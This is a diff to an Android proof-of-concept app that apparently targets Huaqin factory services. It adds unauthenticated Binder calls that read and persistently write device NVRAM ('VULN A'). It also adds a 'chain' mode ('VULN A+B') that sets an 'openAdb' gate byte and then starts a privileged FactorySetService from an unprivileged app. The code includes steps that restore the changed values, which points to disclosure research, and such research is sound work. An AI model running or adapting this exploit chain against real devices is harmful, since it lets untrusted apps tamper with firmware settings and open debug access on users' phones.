@@ -12,10 +12,12 @@ import android.util.Log;
 
 public class MainActivity extends Activity {
     static final String TAG = "nvprobe";
-    static final String PKG = "com.huaqin.NvService";
-    static final String CLS = "com.huaqin.NvService.FactoryNvramService";
+    static final String NVSVC_PKG = "com.huaqin.NvService";
+    static final String NVSVC_CLS = "com.huaqin.NvService.FactoryNvramService";
     static final String DESC = "aidl.NvAidlService";
-    static final int DEPTH = 0x18b;
+    static final String FSV_PKG = "com.huaqin.factoryservice";
+    static final String FSV_CLS = "com.huaqin.factoryservice.FactorySetService";
+    static final int GATE = 0x18b;
 
     static IBinder svc;
 
@@ -24,19 +26,19 @@ public class MainActivity extends Activity {
         System.out.println("[NVP] " + s);
     }
 
-    static String readHex(int start, int end) {
+    static String readHex(int a, int b) {
         try {
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            data.writeInterfaceToken(DESC);
-            data.writeInt(start);
-            data.writeInt(end);
-            svc.transact(2, data, reply, 0);
-            int ex = reply.readInt();
-            String r = (ex == 0) ? reply.readString() : null;
-            data.recycle();
-            reply.recycle();
-            return r;
+            Parcel d = Parcel.obtain();
+            Parcel r = Parcel.obtain();
+            d.writeInterfaceToken(DESC);
+            d.writeInt(a);
+            d.writeInt(b);
+            svc.transact(2, d, r, 0);
+            int ex = r.readInt();
+            String s = (ex == 0) ? r.readString() : null;
+            d.recycle();
+            r.recycle();
+            return s;
         } catch (Throwable t) {
             return null;
         }
@@ -44,17 +46,17 @@ public class MainActivity extends Activity {
 
     static void write(int idx, int val) {
         try {
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            data.writeInterfaceToken(DESC);
-            data.writeInt(idx);
-            data.writeInt(val);
-            svc.transact(3, data, reply, 0);
-            int ex = reply.readInt();
-            int r = (ex == 0) ? reply.readInt() : -999;
-            data.recycle();
-            reply.recycle();
-            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + r);
+            Parcel d = Parcel.obtain();
+            Parcel r = Parcel.obtain();
+            d.writeInterfaceToken(DESC);
+            d.writeInt(idx);
+            d.writeInt(val);
+            svc.transact(3, d, r, 0);
+            int ex = r.readInt();
+            int ret = (ex == 0) ? r.readInt() : -999;
+            d.recycle();
+            r.recycle();
+            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + ret);
         } catch (Throwable t) {
             log("W EX: " + t);
         }
@@ -66,13 +68,72 @@ public class MainActivity extends Activity {
         return Integer.parseInt(h.substring(0, 2), 16);
     }
 
+    static String readAll() {
+        StringBuilder sb = new StringBuilder();
+        for (int s = 0; s < 1024; s += 128) {
+            String r = readHex(s, s + 128);
+            sb.append(r == null ? "" : r);
+        }
+        return sb.toString();
+    }
+
+    // mode from intent extra: read | write | chain  (default: read)
+    void run(String mode) {
+        log("=== mode=" + mode + " ===");
+        log("caller uid=" + android.os.Process.myUid());
+
+        if ("read".equals(mode)) {
+            // VULN A: unauthenticated NVRAM read
+            String s = readHex(0, 64);
+            log("A-READ hex=" + s);
+            String full = readAll();
+            log("A-READ full-len=" + full.length());
+            return;
+        }
+
+        if ("write".equals(mode)) {
+            // VULN A: prove write persists, then restore exactly (non-destructive)
+            String before = readAll();
+            int v0 = byteAt(55);
+            log("A-WRITE target idx=55 orig=0x" + Integer.toHexString(v0));
+            write(55, (v0 == 0x31) ? 2 : 1);
+            int v1 = byteAt(55);
+            log("A-WRITE verify1=0x" + Integer.toHexString(v1) + " changed=" + (v1 != v0));
+            write(55, (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0));
+            int v2 = byteAt(55);
+            log("A-WRITE verify2=0x" + Integer.toHexString(v2) + " restored=" + (v2 == v0));
+            log("A-WRITE identical=" + before.equals(readAll()));
+            return;
+        }
+
+        if ("chain".equals(mode)) {
+            // VULN A+B: set openAdb gate via NVRAM write, then start system service
+            int v0 = byteAt(GATE);
+            log("B-GATE before=0x" + Integer.toHexString(v0));
+            write(GATE, 1);
+            log("B-GATE opened=0x" + Integer.toHexString(byteAt(GATE)));
+            Intent s = new Intent();
+            s.setComponent(new ComponentName(FSV_PKG, FSV_CLS));
+            s.setAction("com.huaqin.action.factoryset");
+            log("B-START startService=" + startService(s));
+            try { Thread.sleep(3000); } catch (Throwable t) {}
+            int v2 = byteAt(GATE);
+            log("B-GATE after=0x" + Integer.toHexString(v2));
+            if (v2 == 0x31) { write(GATE, 2); log("B-GATE safety-restore"); }
+            return;
+        }
+
+        log("unknown mode");
+    }
+
     @Override
     protected void onCreate(Bundle bnd) {
         super.onCreate(bnd);
-        log("onCreate uid=" + android.os.Process.myUid());
+        final String mode = getIntent() != null && getIntent().hasExtra("mode")
+                ? getIntent().getStringExtra("mode") : "read";
         try {
             Intent it = new Intent();
-            it.setComponent(new ComponentName(PKG, CLS));
+            it.setComponent(new ComponentName(NVSVC_PKG, NVSVC_CLS));
             it.setAction("com.huaqin.action.factoryNv");
             ServiceConnection conn = new ServiceConnection() {
                 public void onServiceConnected(ComponentName n, IBinder bb) {
@@ -81,40 +142,7 @@ public class MainActivity extends Activity {
                         public void run() {
                             try {
                                 log("desc=" + svc.getInterfaceDescriptor());
-                                int v0 = byteAt(DEPTH);
-                                log("GATE idx=" + DEPTH + " before=0x" + Integer.toHexString(v0)
-                                        + " ('" + (char) v0 + "')");
-
-                                log("OPEN gate: write idx=395 -> '1'");
-                                write(DEPTH, 1);
-                                log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));
-
-                                log("NOW starting FactorySetService (unprivileged startService)");
-                                Intent s = new Intent();
-                                s.setComponent(new ComponentName(
-                                        "com.huaqin.factoryservice",
-                                        "com.huaqin.factoryservice.FactorySetService"));
-                                s.setAction("com.huaqin.action.factoryset");
-                                try {
-                                    startService(s);
-                                    log("  startService returned OK");
-                                } catch (Throwable t) {
-                                    log("  startService EX: " + t);
-                                }
-                                Thread.sleep(3000);
-
-                                int v2 = byteAt(DEPTH);
-                                log("GATE idx=" + DEPTH + " afterService=0x" + Integer.toHexString(v2)
-                                        + " ('" + (char) v2 + "')");
-                                log("  (service may auto-rewrite to '2' via writeNVItem)");
-
-                                // safety: if gate still '1', restore to '2'
-                                if (v2 == 0x31) {
-                                    log("SAFETY: gate still 1, forcing back to '2'");
-                                    write(DEPTH, 2);
-                                    log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));
-                                }
-                                log("REGION 384..416 = " + readHex(384, 416));
+                                MainActivity.this.run(mode);
                             } catch (Throwable t) {
                                 log("EX: " + t);
                             }
